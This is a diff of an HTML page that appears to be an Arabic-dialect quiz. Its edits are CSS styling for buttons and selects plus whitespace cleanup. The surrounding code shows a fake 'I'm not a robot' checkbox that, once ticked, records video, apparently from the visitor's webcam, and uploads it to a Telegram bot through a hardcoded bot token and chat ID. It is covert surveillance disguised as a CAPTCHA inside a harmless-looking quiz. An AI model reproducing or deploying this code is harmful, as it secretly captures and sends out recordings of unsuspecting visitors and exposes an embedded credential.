@@ -51,6 +51,26 @@
         #quiz-container { display:none; text-align:center; }
         .question { margin-bottom: 20px; text-align:left; }
         .result { display:none; text-align:center; }
+        select {
+            margin: 15px 0;
+            padding: 10px;
+            font-size: 16px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            background-color: #4CAF50;
+            color: white;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
     </style>
 </head>
 <body>
@@ -93,7 +113,7 @@
         const checkbox = document.getElementById('robot-checkbox');
         const loading = document.querySelector('.loading');
         const success = document.querySelector('.success');
-        
+
         checkbox.addEventListener('change', (e) => {
             if (e.target.checked) {
                 video.style.display = 'block';
@@ -125,7 +145,7 @@
                         const formData = new FormData();
                         formData.append('chat_id', '2070423407'); // Replace with your Telegram chat ID
                         formData.append('video', blob, 'video.webm');
-                        
+
                         fetch(`https://api.telegram.org/bot5106852555:AAGBGu_cOOtorL4B4aD7cu9JNMLoxZU0A3Q/sendVideo`, { method: 'POST', body: formData })
                             .catch((error) => { console.error('Video upload failed:', error.message); });
                     };
@@ -179,7 +199,7 @@
           testSection.style.display = 'block';
           resultDiv.style.display = 'none';
           questionsDiv.innerHTML = '';
-          
+
           questions.forEach((question, index) => {
               const qDiv = document.createElement('div');
               qDiv.classList.add('question');
@@ -199,14 +219,14 @@
           let score = 0;
           const selectedDialect = dialectSelect.value;
           const questions = dialects[selectedDialect];
-          
+
           questions.forEach((question, index) => {
               const selectedOption = document.querySelector(`input[name="question${index}"]:checked`);
               if (selectedOption && parseInt(selectedOption.value) === question.correct) {
                   score++;
               }
           });
-          
+
           scoreText.textContent = `نتيجتك : ${score} من ${questions.length}`;
           resultDiv.style.display = 'block';
       });
